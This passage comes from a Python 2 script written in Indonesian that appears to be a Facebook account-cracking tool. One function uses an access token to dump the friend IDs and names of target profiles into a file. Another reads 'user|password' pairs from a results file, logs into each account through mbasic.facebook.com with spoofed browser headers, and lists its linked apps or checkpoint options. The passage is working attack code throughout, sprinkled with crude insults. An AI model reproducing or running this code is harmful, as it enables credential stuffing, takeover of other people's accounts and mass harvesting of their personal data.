                    exit('%s\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90' % (P, K, P))
                    jeda(2)
                except IOError as KeyError:
                    exit(M + '\n[\xe2\x80\xa2] Tidak ada hasil awokawokawok')

            else:
                exit()


def __firrxaraa__():
    try:
        __token__ = open('.token.txt', 'r').read()
    except I0Error:
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;31m Token Invalid Kentod !'
        exit()

    try:
        jalan('\n\x1b[0;96m[\x1b[0;92m+\x1b[0;96m] \x1b[0;97mIni Adalah Menu Dump Secara Banyak/Massal')
        __total = int(raw_input('\x1b[0;36m[\x1b[0;00m?\x1b[0;36m]\x1b[0;00m Mau Dump Berapa Id : '))
    except:
        __total = 1

    __file = raw_input('\n\x1b[0;36m[\x1b[0;00m?\x1b[0;36m]\x1b[0;00m Buat Nama File (Contoh:Aangxd) : ')
    for zx in range(__total):
        zx += 1
        __ids = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m ID Target \x1b[0;33m%s : ' % zx)
        try:
            rex = requests.get('https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s' % (__ids, __token__))
            ex = json.loads(rex.text)
            file = open(__file, 'a')
            id = []
            for a in ex['friends']['data']:
                id.append(a['id'] + '<=>' + a['name'])
                file.write(a['id'] + '<=>' + a['name'] + '\n')
                print '\r\x1b[0;36m[\x1b[0;00m\xe2\x80\xa2\x1b[0;36m]\x1b[0;00m Total -> \x1b[0;36m%s ' % len(id),

        except KeyError:
            print '\x1b[0;36m[\x1b[0;00m!\x1b[0;36m]\x1b[0;00m Lu Cari Id Nya Yang Publik Bangsat !!'
            exit()

    file.close()
    __id = open(__file, 'r').readlines()
    print '\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Total id : %s ' % len(__id)
    print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m File Dump Tersimpan Di : %s ' % __file
    raw_input('\n\x1b[0;36m[\x1b[0;00m!\x1b[0;36m] \x1b[0;97mEnter Lalu Ketik Ulang : python2 face.py')
    exit()


import os, sys, re, time, requests, calendar, random
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser

def cek_opsi():
    print '\n\x1b[0;97m[\x1b[0;93m+\x1b[0;97m] Harap Tambahkan Tanda : \x1b[0;32mhasil/'
    print '\x1b[0;97m[\x1b[0;93m+\x1b[0;97m] Contoh : hasil/CP-23-22-2022.txt'
    file = raw_input('\x1b[0;97m[\x1b[0;93m?\x1b[0;97m] Nama File : \x1b[0;92m')
    if file == '':
        print '\x1b[0;37m[\x1b[0;93m!\x1b[0;97m]Yang Bener Lah Kontol !!'
        exit()
    try:
        self = open(file, 'r').readlines()
    except IOError:
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;31m File tidak di temukan'
        exit()

    print '\x1b[0;97m[\x1b[0;93m+\x1b[0;97m] Total Akun : %s ' % len(self)
    for yes in self:
        fl = yes.replace('\n', '')
        ya = fl.split('|')
        print '\n\x1b[0;00m[\x1b[0;36m+\x1b[0;00m]\x1b[0;97m Mencoba Login :\x1b[0;33m ' + fl.replace(' + ', '')
        try:
            check_in(ya[0].replace(' + ', ''), ya[1])
        except requests.exceptions.ConnectionError:
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Eh Tod, Ndak Ada Koneksi Kontol !'
            exit()
            continue

    print '\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Cek Opsi Selesai !'
    exit()


def check_in(user, pasw):
    mb = 'https://mbasic.facebook.com'
    ua = 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36'
    ses = requests.Session()
    ses.headers.update({'Host': 'mbasic.facebook.com', 
       'cache-control': 'max-age=0', 
       'upgrade-insecure-requests': '1', 
       'origin': mb, 
       'content-type': 'application/x-www-form-urlencoded', 
       'user-agent': ua, 
       'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
       'x-requested-with': 'mark.via.gp', 
       'sec-fetch-site': 'same-origin', 
       'sec-fetch-mode': 'navigate', 
       'sec-fetch-user': '?1', 
       'sec-fetch-dest': 'document', 
       'referer': mb + '/login/?next&ref=dbl&fl&refid=8', 
       'accept-encoding': 'gzip, deflate', 
       'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
    data = {}
    ged = parser(ses.get(mb + '/login/?next&ref=dbl&fl&refid=8', headers={'user-agent': ua}).text, 'html.parser')
    fm = ged.find('form', {'method': 'post'})
    list = [
     'lsd',
     'jazoest',
     'm_ts',
     'li',
     'try_number',
     'unrecognized_tries',
     'login',
     'bi_xrwh']
    for i in fm.find_all('input'):
        if i.get('name') in list:
            data.update({i.get('name'): i.get('value')})
            continue
            continue

    data.update({'email': user, 
       'pass': pasw})
    run = parser(ses.post(mb + fm.get('action'), data=data, allow_redirects=True).text, 'html.parser')
    if 'c_user' in ses.cookies:
        kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
        run = parser(ses.get('https://mbasic.facebook.com/settings/apps/tabbed/', cookies={'cookie': kuki}).text, 'html.parser')
        xe = [ re.findall('\\<span.*?href=".*?">(.*?)<\\/a><\\/span>.*?\\<div class=".*?">(.*?)<\\/div>', str(td)) for td in run.find_all('td', {'aria-hidden': 'false'})
             ][2:]
        print ' \x1b[0;00m[\x1b[0;93m+\x1b[0;00m]\x1b[0;36m Aplikasi Terkait :\x1b[0;33m ' + str(len(xe))
        num = 0
        for _ in xe:
            num += 1
            print '  \x1b[0;00m[\x1b[0;36m' + str(num) + '\x1b[0;00m]\x1b[0;36m ' + _[0][0] + '\x1b[0;00m,\x1b[0;36m ' + _[0][1]

    elif 'checkpoint' in ses.cookies:
        form = run.find('form')
        dtsg = form.find('input', {'name': 'fb_dtsg'})['value']
        jzst = form.find('input', {'name': 'jazoest'})['value']
        nh = form.find('input', {'name': 'nh'})['value']
        dataD = {'fb_dtsg': dtsg, 
           'fb_dtsg': dtsg, 
           'jazoest': jzst, 
           'jazoest': jzst, 
           'checkpoint_data': '', 
           'submit[Continue]': 'Lanjutkan', 
           'nh': nh}
        parr = parser(ses.post(mb + form['action'], data=dataD).text, 'html.parser')
        proo = [ yy.text for yy in parr.find_all('option') ]
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;97m Terdapat\x1b[0;93m %s \x1b[0;97mopsi ' % str(len(proo))
        for opt in range(len(proo)):
            print '  \x1b[0;97m[\x1b[0;36m' + str(opt + 1) + '\x1b[0;97m]\x1b[0;00m ' + proo[opt]

    elif 'login_error' in str(run):
        oh = run.find('div', {'id': 'login_error'}).find('div').text
        print '\x1b[0;97m[\x1b[0;93m+\x1b[0;97m] %s ' % oh
    else:
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;31m Login gagal, periksa username & password'


if __name__ == '__main__':
    os.system('git pull')
    folder()
    menu()
